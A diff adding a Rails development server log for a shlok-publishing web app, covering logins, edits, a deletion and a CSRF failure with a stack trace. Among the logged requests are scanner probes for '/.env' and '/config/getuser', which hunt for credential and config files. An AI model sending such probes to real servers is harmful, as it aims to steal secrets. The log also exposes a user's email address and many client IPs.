+  Rendered layout layouts/application.html.erb (Duration: 6.0ms | Allocations: 3332)
+Completed 200 OK in 7ms (Views: 6.7ms | ActiveRecord: 0.0ms | Allocations: 3757)
+
+
+Started GET "/logging/login" for 49.44.80.132 at 2022-01-06 02:46:44 +0000
+Cannot render console from 49.44.80.132! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 0.8ms | Allocations: 310)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.1ms | Allocations: 3341)
+Completed 200 OK in 6ms (Views: 5.6ms | ActiveRecord: 0.0ms | Allocations: 3704)
+
+
+Started GET "/logging/loginp" for 49.44.87.196 at 2022-01-06 02:46:44 +0000
+Cannot render console from 49.44.87.196! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/logging/loginp"):
+  
+Started POST "/logging/loginp" for 157.35.63.159 at 2022-01-06 02:47:14 +0000
+Cannot render console from 157.35.63.159! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"mohak_k@ph.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (1.0ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "mohak_k@ph.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 4ms (ActiveRecord: 1.0ms | Allocations: 950)
+
+
+Started GET "/shlok/ashlokr" for 157.35.63.159 at 2022-01-06 02:47:14 +0000
+Cannot render console from 157.35.63.159! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.2ms | Allocations: 1082)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.4ms | Allocations: 4110)
+Completed 200 OK in 8ms (Views: 6.9ms | ActiveRecord: 1.0ms | Allocations: 4522)
+
+
+Started GET "/shlok/ashlokr" for 150.107.9.5 at 2022-01-06 02:47:16 +0000
+Cannot render console from 150.107.9.5! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+Redirected to http://13.127.46.121/
+Completed 302 Found in 1ms (ActiveRecord: 0.0ms | Allocations: 207)
+
+
+Started GET "/" for 150.107.9.5 at 2022-01-06 02:47:17 +0000
+Cannot render console from 150.107.9.5! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.4ms | Allocations: 3093)
+Completed 200 OK in 5ms (Views: 4.8ms | ActiveRecord: 0.0ms | Allocations: 3475)
+
+
+Started GET "/config/getuser?index=0" for 209.141.53.74 at 2022-01-06 02:55:45 +0000
+Cannot render console from 209.141.53.74! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/config/getuser"):
+  
+Started GET "/" for 152.57.163.89 at 2022-01-06 03:00:06 +0000
+Cannot render console from 152.57.163.89! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.5ms | Allocations: 3109)
+Completed 200 OK in 7ms (Views: 5.9ms | Allocations: 3488)
+
+
+Started GET "/logging/login" for 152.57.163.89 at 2022-01-06 03:00:27 +0000
+Cannot render console from 152.57.163.89! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 0.5ms | Allocations: 297)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.7ms | Allocations: 3328)
+Completed 200 OK in 7ms (Views: 6.2ms | Allocations: 3745)
+
+
+Started GET "/" for 152.57.163.89 at 2022-01-06 03:00:31 +0000
+Cannot render console from 152.57.163.89! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.4ms | Allocations: 3103)
+Completed 200 OK in 5ms (Views: 4.8ms | Allocations: 3530)
+
+
+Started GET "/" for 43.224.3.182 at 2022-01-06 03:00:56 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.0ms | Allocations: 3093)
+Completed 200 OK in 6ms (Views: 5.5ms | Allocations: 3470)
+
+
+Started GET "/logging/login" for 43.224.3.182 at 2022-01-06 03:01:00 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 0.5ms | Allocations: 297)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.2ms | Allocations: 3328)
+Completed 200 OK in 6ms (Views: 5.6ms | Allocations: 3746)
+
+
+Started POST "/logging/loginp" for 43.224.3.182 at 2022-01-06 03:01:11 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"mohak_k@ph.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (0.8ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "mohak_k@ph.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 17ms (ActiveRecord: 9.5ms | Allocations: 4014)
+
+
+Started GET "/shlok/ashlokr" for 43.224.3.182 at 2022-01-06 03:01:11 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.7ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.8ms | Allocations: 1082)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.2ms | Allocations: 4110)
+Completed 200 OK in 9ms (Views: 6.9ms | ActiveRecord: 1.7ms | Allocations: 4522)
+
+
+Started GET "/shlok/4" for 43.224.3.182 at 2022-01-06 03:01:29 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"4"}
+  [1m[36mShlok Load (0.8ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 4], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 0.8ms | Allocations: 441)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.8ms | Allocations: 3458)
+Completed 200 OK in 10ms (Views: 6.7ms | ActiveRecord: 0.8ms | Allocations: 4546)
+
+
+Started POST "/shlok/4" for 43.224.3.182 at 2022-01-06 03:02:05 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokup as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"ALLITERATION", "shlok"=>"विभूषितानङ्गरिपूत्तमाङ्गा<br/>\r\nसद्यः कृतानेकजनार्तिभङ्गा |<br/>\r\nमनोहरोत्तुङ्गचलत्तरङ्गा<br/><br/>\r\nगङ्गा ममाङ्गान्यमलीकरोतु ||<br/>", "translation"=>"This shloka is part of Ganga-Lahari (Waves of Ganga), composed by Pandit Jagannath.<br/>\r\nThe story behind this famous composition is as interesting as the essence of the shloka itself. Pandit Jagannath, when faced with a terrible crisis, decides to please Mother Ganga by singing verses in her praise. He composes 52 shlokas there and then on the banks of Ganga, and with each shloka, she (Mother Ganga) rises one step. Eventually, the great pandit becomes one with her, that is, he dies a noble death.<br/>\r\nThis particular shloka, composed in the viparītākhyānikī (विपरीताख्यानिकी) meter, is the 52nd shloka of Ganga-Lahari, and exemplifies the genius of Pandit Jagannath. The repetition of the ङ्ग sound is the key feature - the literary device of alliteration is used, but the arrangement of the adjectives used for Ganga is the true beauty; remember he was doing it extempore!<br/><br/>\r\n\r\nविभूषिता अनङ्ग-रिपु-उत्तम-अङ्गा The one who adorns the upper-most part of the enemy of Ananga [Lord of Kama], that is, the one who adorns the head of Lord Shiva!<br/>\r\nसद्यः कृता अनेक-जन-आर्ति-भङ्गा The one who immediately destroys multiple griefs of people,<br/>\r\nमनोहरा उत्तुङ्ग-चलत्तरङ्गा The one whose huge waves are delightful,<br/>\r\nगङ्गा मम अङ्गानि अमली-करोतु O Ganga, make my parts (of the body) clean/pure.", "commit"=>"अग्रेस्थापनं करोतु", "id"=>"4"}
+Can't verify CSRF token authenticity.
+Completed 422 Unprocessable Entity in 1ms (ActiveRecord: 0.0ms | Allocations: 646)
+
+
+  
+ActionController::InvalidAuthenticityToken (ActionController::InvalidAuthenticityToken):
+  
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:211:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:243:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:238:in `verify_authenticity_token'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:427:in `block in make_lambda'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:198:in `block (2 levels) in halting'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:34:in `block (2 levels) in <module:Callbacks>'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:199:in `block in halting'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `block in invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `each'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:115:in `block in run_callbacks'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
+activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
+activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
+actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
+actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:40:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
+activerecord (6.1.4.4) lib/active_record/migration.rb:601:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
+web-console (4.2.0) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.2.0) lib/web_console/middleware.rb:19:in `block in call'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `block in tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:37:in `tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `tagged'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.4.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/static.rb:24:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:119:in `call'
+rack-mini-profiler (2.3.3) lib/mini_profiler/profiler.rb:393:in `call'
+webpacker (5.4.3) lib/webpacker/dev_server_proxy.rb:25:in `perform_request'
+rack-proxy (0.7.0) lib/rack/proxy.rb:63:in `call'
+railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/rack/thread_handler_extension.rb:97:in `process_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:157:in `accept_and_process_next_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:110:in `main_loop'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler.rb:415:in `block (3 levels) in start_threads'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/utils.rb:113:in `block in create_thread_and_abort_on_exception'
+Started GET "/shlok/4" for 43.224.3.182 at 2022-01-06 03:02:29 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"4"}
+  [1m[36mShlok Load (0.7ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 4], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 1.0ms | Allocations: 438)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.0ms | Allocations: 3471)
+Completed 200 OK in 11ms (Views: 6.7ms | ActiveRecord: 0.7ms | Allocations: 4555)
+
+
+Started POST "/" for 135.125.217.54 at 2022-01-06 03:08:19 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (1.0ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 135.125.217.54 at 2022-01-06 03:08:20 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/shlok/4" for 43.224.3.182 at 2022-01-06 03:08:29 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokup as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"ALLITERATION", "shlok"=>"विभूषितानङ्गरिपूत्तमाङ्गा<br/>\r\nसद्यः कृतानेकजनार्तिभङ्गा |<br/>\r\nमनोहरोत्तुङ्गचलत्तरङ्गा<br/><br/>\r\nगङ्गा ममाङ्गान्यमलीकरोतु ||<br/>", "translation"=>"This shloka is part of Ganga-Lahari (Waves of Ganga), composed by Pandit Jagannath.<br/>\r\nThe story behind this famous composition is as interesting as the essence of the shloka itself. Pandit Jagannath, when faced with a terrible crisis, decides to please Mother Ganga by singing verses in her praise. He composes 52 shlokas there and then on the banks of Ganga, and with each shloka, she (Mother Ganga) rises one step. Eventually, the great pandit becomes one with her, that is, he dies a noble death.<br/>\r\nThis particular shloka, composed in the viparītākhyānikī (विपरीताख्यानिकी) meter, is the 52nd shloka of Ganga-Lahari, and exemplifies the genius of Pandit Jagannath. The repetition of the ङ्ग sound is the key feature - the literary device of alliteration is used, but the arrangement of the adjectives used for Ganga is the true beauty; remember he was doing it extempore!<br/><br/>\r\n\r\nविभूषिता अनङ्ग-रिपु-उत्तम-अङ्गा The one who adorns the upper-most part of the enemy of Ananga [Lord of Kama], that is, the one who adorns the head of Lord Shiva!<br/>\r\nसद्यः कृता अनेक-जन-आर्ति-भङ्गा The one who immediately destroys multiple griefs of people,<br/>\r\nमनोहरा उत्तुङ्ग-चलत्तरङ्गा The one whose huge waves are delightful,<br/>\r\nगङ्गा मम अङ्गानि अमली-करोतु O Ganga, make my parts (of the body) clean/pure.", "commit"=>"अग्रेस्थापनं करोतु", "id"=>"4"}
+  [1m[36mShlok Load (0.8ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 4], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:42:in `ashlokup'
+  [1m[36mTRANSACTION (1.0ms)[0m  [1m[35mBEGIN[0m
+  ↳ app/controllers/shlok_controller.rb:43:in `ashlokup'
+  [1m[36mShlok Update (1.0ms)[0m  [1m[33mUPDATE "shloks" SET "shlok" = $1 WHERE "shloks"."sid" = $2[0m  [["shlok", "विभूषितानङ्गरिपूत्तमाङ्गा<br/>\r\nसद्यः कृतानेकजनार्तिभङ्गा |<br/>\r\nमनोहरोत्तुङ्गचलत्तरङ्गा<br/><br/>\r\nगङ्गा ममाङ्गान्यमलीकरोतु ||<br/>"], ["sid", 4]]
+  ↳ app/controllers/shlok_controller.rb:43:in `ashlokup'
+  [1m[36mTRANSACTION (1.7ms)[0m  [1m[35mCOMMIT[0m
+  ↳ app/controllers/shlok_controller.rb:43:in `ashlokup'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 41ms (ActiveRecord: 11.0ms | Allocations: 9601)
+
+
+Started GET "/shlok/ashlokr" for 43.224.3.182 at 2022-01-06 03:08:29 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.7ms | Allocations: 1626)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 14.1ms | Allocations: 8820)
+Completed 200 OK in 17ms (Views: 15.3ms | ActiveRecord: 0.9ms | Allocations: 10289)
+
+
+Started GET "/shlok/rshlok" for 152.57.184.154 at 2022-01-06 03:10:32 +0000
+Cannot render console from 152.57.184.154! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 3.5ms | Allocations: 1054)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 14.1ms | Allocations: 4087)
+Completed 200 OK in 16ms (Views: 14.0ms | ActiveRecord: 0.9ms | Allocations: 4680)
+
+
+Started GET "/shlok/5/del" for 43.224.3.182 at 2022-01-06 03:12:50 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokdp as HTML
+  Parameters: {"id"=>"5"}
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 5], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:49:in `ashlokdp'
+  [1m[36mTRANSACTION (3.4ms)[0m  [1m[35mBEGIN[0m
+  ↳ app/controllers/shlok_controller.rb:50:in `ashlokdp'
+  [1m[36mShlok Destroy (1.4ms)[0m  [1m[31mDELETE FROM "shloks" WHERE "shloks"."sid" = $1[0m  [["sid", 5]]
+  ↳ app/controllers/shlok_controller.rb:50:in `ashlokdp'
+  [1m[36mTRANSACTION (1.6ms)[0m  [1m[35mCOMMIT[0m
+  ↳ app/controllers/shlok_controller.rb:50:in `ashlokdp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 12ms (ActiveRecord: 7.4ms | Allocations: 2785)
+
+
+Started GET "/shlok/ashlokr" for 43.224.3.182 at 2022-01-06 03:12:50 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (3.7ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 16.5ms | Allocations: 976)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 25.0ms | Allocations: 4020)
+Completed 200 OK in 26ms (Views: 21.8ms | ActiveRecord: 3.7ms | Allocations: 4444)
+
+
+Started GET "/" for 23.251.102.74 at 2022-01-06 03:36:22 +0000
+Cannot render console from 23.251.102.74! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.4ms | Allocations: 200)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.1ms | Allocations: 3466)
+Completed 200 OK in 9ms (Views: 7.5ms | Allocations: 4670)
+
+
+Started HEAD "/" for 60.191.125.35 at 2022-01-06 03:36:26 +0000
+Cannot render console from 60.191.125.35! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.1ms | Allocations: 3093)
+Completed 200 OK in 6ms (Views: 5.5ms | Allocations: 3609)
+
+
+Started GET "/shlok/ashlokr" for 43.224.3.182 at 2022-01-06 03:48:57 +0000
+Cannot render console from 43.224.3.182! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.2ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 22.9ms | Allocations: 4399)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 31.3ms | Allocations: 7427)
+Completed 200 OK in 33ms (Views: 31.9ms | ActiveRecord: 14.6ms | Allocations: 7857)
+
+
+Started GET "/" for 216.218.206.68 at 2022-01-06 04:07:25 +0000
+Cannot render console from 216.218.206.68! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.5ms | Allocations: 3109)
+Completed 200 OK in 8ms (Views: 7.0ms | Allocations: 3488)
+
+
+Started GET "/shlok/rshlok" for 152.57.185.104 at 2022-01-06 04:33:23 +0000
+Cannot render console from 152.57.185.104! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 17.9ms | Allocations: 4047)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 22.4ms | Allocations: 7080)
+Completed 200 OK in 24ms (Views: 23.0ms | ActiveRecord: 11.6ms | Allocations: 7487)
+
+
+Started GET "/logging/login" for 152.57.185.104 at 2022-01-06 04:33:43 +0000
+Cannot render console from 152.57.185.104! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 1.4ms | Allocations: 741)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.2ms | Allocations: 3959)
+Completed 200 OK in 11ms (Views: 8.7ms | ActiveRecord: 0.0ms | Allocations: 5155)
+
+
+Started POST "/logging/loginp" for 152.57.185.104 at 2022-01-06 04:33:51 +0000
+Cannot render console from 152.57.185.104! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
